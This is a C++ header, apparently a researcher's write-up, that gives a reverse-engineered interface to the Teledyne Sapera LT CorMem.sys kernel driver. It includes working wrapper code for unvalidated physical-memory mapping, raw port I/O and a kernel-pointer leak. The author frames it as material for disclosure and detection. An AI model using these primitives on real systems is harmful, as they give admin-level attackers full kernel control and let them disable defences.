// cormem.h - user-mode interface to Teledyne Sapera LT CorMem.sys
//
// reversed from the 9.00 x64 build (Sapera LT "Sapera Memory Manager").
// verified against the signed sample 40C855D2...ED0F and the unsigned
// copy 99770547...A42247 - same interface on both.
//
// device is \\.\CORMEM (\Device\CORMEM, symlink \DosDevices\CORMEM).
// created with plain IoCreateDevice so it gets the default ACL, which
// means admin/SYSTEM only. the driver never checks anything else - no
// per-call access checks anywhere, so admin == kernel, effectively.
//
// every ioctl is CTL_CODE(0x22, func, FILE_ANY_ACCESS, METHOD_BUFFERED).
// the dispatch at 0x140002c5c folds the func codes through sub-chains
// instead of cmp immediates, which is why string-scanning the binary for
// 0x222xxx constants only turns up a fraction of them.
//
// works for reporting/detection purposes. not a weapon, don't be one.

#pragma once
#include <windows.h>
#include <cstdint>

#define CORMEM_DEVICE_PATH  L"\\\\.\\CORMEM"
#define CORMEM_NT_PATH      L"\\Device\\CORMEM"
#define CORMEM_LOG_PATH     L"\\Device\\CORLOG"      // secondary debug device
#define CORMEM_REG_PARAMS   L"\\REGISTRY\\Machine\\System\\CurrentControlSet\\Services\\CorMem\\Parameters"
#define CORMEM_PHYS_SECTION L"\\Device\\PhysicalMemory"

// func code -> dispatch target (9.00 build addresses)
#define CORMEM_CTL(fn) CTL_CODE(FILE_DEVICE_UNKNOWN, fn, FILE_ANY_ACCESS, METHOD_BUFFERED)

enum cormem_ioctl : DWORD {
    // 0x222000 -> sub_1400067E8, query, out <= 0x1C bytes, layout not fully mapped
    cormem_query_info    = CORMEM_CTL(0x800),
    // 0x222004, free/lookup by pool id, walks the object list @ 0x140006B74
    cormem_free          = CORMEM_CTL(0x801),
    // 0x222008, hands out 88 bytes of kernel code pointers. yes really.
    cormem_get_funcs     = CORMEM_CTL(0x802),
    // 0x22200C -> sub_140006154 -> sub_14000147C, the phys map primitive
    cormem_map_phys      = CORMEM_CTL(0x806),
    // 0x222010 -> sub_140006E40, arg plumbing matches siblings, semantics unknown
    cormem_unk_808       = CORMEM_CTL(0x808),
    // 0x222014 -> sub_140006AA4, 'in al/ax/eax, dx' with user port. no whitelist.
    cormem_in_port       = CORMEM_CTL(0x80A),
    // 0x222018 -> sub_140006F7C, 'out dx, al/ax/eax'. pairs with the above.
    cormem_out_port      = CORMEM_CTL(0x80C),
    // 0x22201C -> sub_1400060A0, MmProbeAndLockPages + MmMapLockedPagesSpecifyCache
    // on caller pages, kernel alias handed back. probe'd, so less useful than map.
    cormem_lock_pages    = CORMEM_CTL(0x80E),
    // 0x222034, inline @ 0x140002FC6. same phys map but split-field layout so
    // wow64 processes can pass a full 64-bit phys addr.
    cormem_map_phys_w64  = CORMEM_CTL(0x81A),
    // remaining queries, not mapped in detail: 0x222020-0x222030 object ops,
    // 0x222038/3C/54/58 config queries.
    cormem_unk_810       = CORMEM_CTL(0x810),
    cormem_unk_812       = CORMEM_CTL(0x812),
    cormem_unk_814       = CORMEM_CTL(0x814),
    cormem_unk_816       = CORMEM_CTL(0x816),
    cormem_unk_818       = CORMEM_CTL(0x818),
    cormem_query_cfg     = CORMEM_CTL(0x81E),
    cormem_query_820     = CORMEM_CTL(0x820),
    cormem_query_82a     = CORMEM_CTL(0x82A),
    cormem_query_82c     = CORMEM_CTL(0x82C),
};

// statuses i've seen it return
enum cormem_status : NTSTATUS {
    cormem_ok               = 0x00000000,
    cormem_err_invalid      = 0xC000000D,   // bad width value on port io
    cormem_err_nores        = 0xC000009A,   // input/output length check failed
    cormem_err_unsupported  = 0xC00000BB,
    cormem_err_failed       = 0xC0000001,
};

#pragma pack(push, 1)

// ---- 0x22200C (cormem_map_phys) --------------------------------------------
// consumes 24 bytes but only reads 16: phys + window. the third qword gets
// loaded then immediately overwritten with 1 internally, it does nothing.
// window is what goes into ZwMapViewOfSection's SectionOffset and the driver
// compensates on the way out (kva = view_base + (phys - window)), so setting
// window == phys gives you the exact page. no validation on either field.
struct CORMEM_MAP_REQ {
    uint64_t phys;
    uint64_t window;
    uint64_t unused;
};

// reply is a single qword, the kernel VA. 32-bit processes get it truncated
// to a dword @ sub_1400062B4, which is useless for anything above 4G -
// use the w64 ioctl from wow64 instead.
struct CORMEM_MAP_RET {
    uint64_t kva;
};

// ---- 0x222034 (cormem_map_phys_w64) ----------------------------------------
// wow64-friendly. inline handler, in >= 0x10 and out >= 0x10 enforced.
struct CORMEM_MAP_REQ_W64 {
    uint32_t phys_lo;
    uint32_t phys_hi;
    uint32_t len_lo;
    uint32_t len_hi;
};

// NOTE: the native path @ sub_140006154 sign-extends the high dword for
// 32-bit processes (movsxd), so native 32-bit callers are capped at phys
// addrs < 2GB. the w64 ioctl exists precisely to get around that.

// ---- 0x222014 (cormem_in_port) ---------------------------------------------
// width 1 = in al,dx / 2 = in ax,dx / 3 = in eax,dx. anything else ->
// STATUS_INVALID_PARAMETER. result lands back in the same buffer you sent.
// 64-bit callers: 8 byte struct. wow64 callers: the driver reads a qword
// then a dword, so just keep it 8 bytes and it works either way.
struct CORMEM_PORT_IN {
    uint32_t width;
    uint32_t port;
};

struct CORMEM_PORT_IN_RET {
    uint32_t value;
};

// ---- 0x222018 (cormem_out_port) --------------------------------------------
// same width encoding. in >= 0x10 enforced.
struct CORMEM_PORT_OUT {
    uint32_t width;
    uint32_t port;
    uint32_t value;
    uint32_t pad;
};

// ---- 0x222008 (cormem_get_funcs) -------------------------------------------
// out is min(InputBufferLength, 0x88) bytes from a static table. 15 pointers
// into the driver image = free ASLR defeat for the driver itself. in can be
// null/0.
struct CORMEM_FUNC_TABLE {
    uint32_t count;          // 15 on 9.00
    uint32_t pad;
    uint64_t funcs[15];
};

// pool object layout, kernel side only (walked @ 0x140006B74). ids from the
// alloc ioctls reference these. listed here since the id is user-visible.
// +0x00 id
// +0x10 value
// +0x28 next

#pragma pack(pop)

class CorMemDriver {
public:
    CorMemDriver() = default;
    ~CorMemDriver() { close(); }
    CorMemDriver(const CorMemDriver&) = delete;
    CorMemDriver& operator=(const CorMemDriver&) = delete;
    CorMemDriver(CorMemDriver&& o) noexcept : h(o.h) { o.h = INVALID_HANDLE_VALUE; }

    bool open() {
        if (h != INVALID_HANDLE_VALUE) return true;
        h = CreateFileW(CORMEM_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0,
                        nullptr, OPEN_EXISTING, 0, nullptr);
        return h != INVALID_HANDLE_VALUE;
    }

    void close() {
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); h = INVALID_HANDLE_VALUE; }
    }

    bool is_open() const { return h != INVALID_HANDLE_VALUE; }

    // map any physical address, get the kernel VA back. 0 on failure.
    uint64_t map_phys(uint64_t pa) {
        CORMEM_MAP_REQ req{ pa, pa, 0 };
        CORMEM_MAP_RET ret{};
        if (!transact(cormem_map_phys, &req, sizeof(req), &ret, sizeof(ret)))
            return 0;
        return ret.kva;
    }

    // same thing through the wow64 path, for 32-bit processes / phys > 2GB
    uint64_t map_phys_w64(uint64_t pa, uint64_t len = 0x1000) {
        CORMEM_MAP_REQ_W64 req{ (uint32_t)pa, (uint32_t)(pa >> 32),
                                (uint32_t)len, (uint32_t)(len >> 32) };
        CORMEM_MAP_RET ret{};
        if (!transact(cormem_map_phys_w64, &req, sizeof(req), &ret, sizeof(ret)))
            return 0;
        return ret.kva;
    }

    // port io. width: 1, 2 or 3 (byte, word, dword)
    bool in_port(uint16_t port, uint32_t width, uint32_t& out) {
        CORMEM_PORT_IN in{ width, port };
        if (!transact(cormem_in_port, &in, sizeof(in), &in, sizeof(in)))
            return false;
        out = reinterpret_cast<CORMEM_PORT_IN_RET*>(&in)->value;
        return true;
    }

    bool out_port(uint16_t port, uint32_t width, uint32_t value) {
        CORMEM_PORT_OUT out{ width, port, value, 0 };
        return transact(cormem_out_port, &out, sizeof(out), &out, sizeof(out));
    }

    // convenience shorthands
    bool inb(uint16_t port, uint8_t& v)  { uint32_t t; if (!in_port(port, 1, t)) return false; v = (uint8_t)t;  return true; }
    bool inw(uint16_t port, uint16_t& v) { uint32_t t; if (!in_port(port, 2, t)) return false; v = (uint16_t)t; return true; }
    bool ind(uint16_t port, uint32_t& v) { return in_port(port, 3, v); }

    // kernel code pointers from the driver's own table
    bool get_funcs(CORMEM_FUNC_TABLE& t) {
        return transact(cormem_get_funcs, nullptr, 0, &t, sizeof(t));
    }

    // proof-of-life for port io: read an RTC clock register. index write to
    // 0x70 + data read from 0x71 touches nothing, so it's the safest way to
    // show the primitive works. clock runs in BCD.
    uint8_t rtc_read(uint8_t reg) {
        out_port(0x70, 1, reg);
        uint32_t v = 0;
        in_port(0x71, 1, v);
        return (uint8_t)v;
    }

    HANDLE handle() const { return h; }

private:
    bool transact(DWORD code, void* in, DWORD in_len, void* out, DWORD out_len) {
        if (h == INVALID_HANDLE_VALUE) return false;
        DWORD got = 0;
        return DeviceIoControl(h, code, in, in_len, out, out_len, &got, nullptr) != FALSE;
    }

    HANDLE h = INVALID_HANDLE_VALUE;
};
